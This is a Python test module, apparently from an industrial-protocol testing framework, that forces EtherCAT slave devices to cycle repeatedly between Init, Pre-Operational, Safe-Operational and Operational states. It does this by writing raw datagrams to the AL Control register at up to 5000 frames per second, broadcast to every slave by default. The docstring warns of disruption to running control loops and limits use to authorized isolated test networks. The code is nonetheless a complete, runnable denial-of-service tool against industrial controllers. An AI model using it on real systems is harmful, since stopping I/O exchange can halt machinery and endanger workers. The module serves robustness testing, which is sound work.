"""
測項：EtherCAT AL Control 應用層狀態機強制切換測試
分類：EtherCAT（Layer 2，EtherType 0x88A4）
說明：EtherCAT Slave 的應用層狀態機（AL State Machine，ETG.1000-6 定義）依序為
Init → Pre-Operational → Safe-Operational → Operational 四個狀態，正常情況下由
主站（Master）依序完成各階段的組態/驗證後才會推進到下一狀態，狀態切換是透過寫入
每顆 Slave ESC（EtherCAT Slave Controller）位於固定暫存器位址 0x0120 的 AL Control
暫存器（2 bytes，低位元組為目標狀態代碼：0x01=Init／0x02=Pre-Op／0x04=Safe-Op／
0x08=Op，高位元組保留給 Error Indication Acknowledge 等旗標）來觸發。

本測項與既有的 ethercat/broadcast_read_flood.py（純讀取、不改變任何狀態）、
ethercat/l2_frame_flood.py（固定原始位元組注入）、
ethercat/malformed_length_boundary_test.py（長度欄位邊界異常，仍是讀取類 datagram）
三者都不同：這是本專案第一個**主動對 Slave 應用層狀態機下達寫入指令**的測項，
測試的是 ESC 狀態機對「高頻率、非預期時機」的狀態切換請求（尤其是要求從
Operational 強制退回 Init 這種正常流程中不會頻繁發生的跳躍式切換）的處理健全性
與復原能力——例如：狀態機是否會卡在中介狀態、切換過程中是否遺失或誤判既有的
Process Data 交換、切換旗標（Error Indication）是否正確回報等。

**風險等級提醒（比既有的純讀取/L2注入類 EtherCAT 測項更高，操作前務必確認範圍）**：
強制切換 AL 狀態會直接影響 Slave 當下的製程資料交換行為（例如從 Operational
退回 Init 意味著該 Slave 掛載的 I/O 模組會暫時停止參與循環資料交換），這與
broadcast_read_flood.py 等純讀取型測項的風險程度不同，性質上更接近「主動干擾
運作中的控制迴圈」。**僅能在受測、已授權、確認未接實際產線/機台負載的隔離測試
網段上執行**，執行前務必與受測方確認目標 Slave 當下沒有正在驅動任何有安全疑慮的
實體致動器（馬達、氣缸等）。

實作：依 ETG.1000-4 公開規範手動組出 FPWR（Configured Address Physical Write，
Cmd=5，寫入指定 Station Address 的 Slave）或 BWR（Broadcast Write，Cmd=6，station_addr
設為 0 時使用，對匯流排上全部 Slave 廣播寫入）Datagram，依序在
[Init, Pre-Op, Safe-Op, Op] 之間循環寫入 AL Control 暫存器，讓狀態機反覆被要求
跳躍切換。與其餘 EtherCAT 測項一致，訊框位元欄位配置依公開規範手動組出，未經
真實 ESC 硬體逐位元驗證，如與特定廠牌韌體行為不符，請以實際抓包比對調整。
需求：scapy、且需要 root 或 CAP_NET_RAW 權限。
"""
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "EtherCAT AL Control 應用層狀態機強制切換測試"
CATEGORY = "EtherCAT"
PROTOCOL = "L2"
TEST_TYPE = "resource"  # 資源/狀態面向：反覆強制觸發應用層狀態機切換，非單純流量灌注

AL_CONTROL_ADDR = 0x0120  # ETG.1000-4 規範固定位址：AL Control 暫存器
_STATE_SEQUENCE = [0x01, 0x02, 0x04, 0x08]  # Init -> Pre-Op -> Safe-Op -> Op 依序循環


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "station_addr": {
            "type": "int", "default": 0, "min": 0, "max": 65535,
            "desc": "目標 Slave Configured Station Address（0 = 使用 BWR 對全部 Slave 廣播寫入；"
                    "非 0 則改用 FPWR 只對該位址的單一 Slave 寫入，較能限縮影響範圍，建議優先使用）",
        },
        "rate_pps": {"type": "int", "default": 5000, "min": 1, "max": 5000, "desc": "每秒送出狀態切換 datagram 數"},
    }


def _build_al_control_write(idx: int, cmd: int, adp: int, state_code: int) -> bytes:
    """組出一個 EtherCAT Header + 單一 AL Control 寫入 Datagram 的原始 payload（不含 Ethernet Header）。"""
    ado = AL_CONTROL_ADDR
    data = struct.pack("<H", state_code)  # AL Control 暫存器內容：低位元組為目標狀態代碼
    wkc = b"\x00\x00"

    round_trip_c = 0
    more_m = 0
    len_m = (len(data) & 0x07FF) | (round_trip_c << 14) | (more_m << 15)

    dgram_header = struct.pack("<BBHHH", cmd, idx & 0xFF, adp, ado, len_m) + b"\x00\x00"
    dgram = dgram_header + data + wkc

    total_len = len(dgram)
    ecat_header_val = (total_len & 0x07FF) | (1 << 12)
    ecat_header = struct.pack("<H", ecat_header_val)

    return ecat_header + dgram


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    station_addr = int(params.get("station_addr", 0))
    rate = int(params.get("rate_pps", 200))

    if station_addr == 0:
        cmd, dst_mac, mode_desc = 6, "ff:ff:ff:ff:ff:ff", "BWR 廣播（全部 Slave）"
    else:
        cmd, dst_mac, mode_desc = 5, "ff:ff:ff:ff:ff:ff", f"FPWR（station_addr=0x{station_addr:04X}）"
        # EtherCAT 是共享匯流排拓樸，即使是針對單一位址的 FPWR，Ethernet 層一樣以
        # 廣播/固定目的 MAC 送出，實際定址靠 Datagram Header 的 ADP 欄位完成。

    limiter = RateLimiter(rate)
    sent = 0
    idx = 0
    seq_pos = 0
    start = time.time()

    log_fn(f"[+] EtherCAT AL Control 狀態機強制切換 -> iface={iface}, {mode_desc}, {rate}pps, {duration}s"
           f"（依序循環 Init/Pre-Op/Safe-Op/Op）")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        state_code = _STATE_SEQUENCE[seq_pos % len(_STATE_SEQUENCE)]
        seq_pos += 1
        payload = _build_al_control_write(idx, cmd, station_addr, state_code)
        idx = (idx + 1) & 0xFF
        pkt = Ether(dst=dst_mac, type=0x88A4) / Raw(load=payload)
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # 一併攔截 ValueError：scapy 在 iface 參數指向不存在的網路介面時會丟出
            # 這個例外類型，統一在此攔截並輸出清楚的錯誤訊息，避免原始 traceback 外洩。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
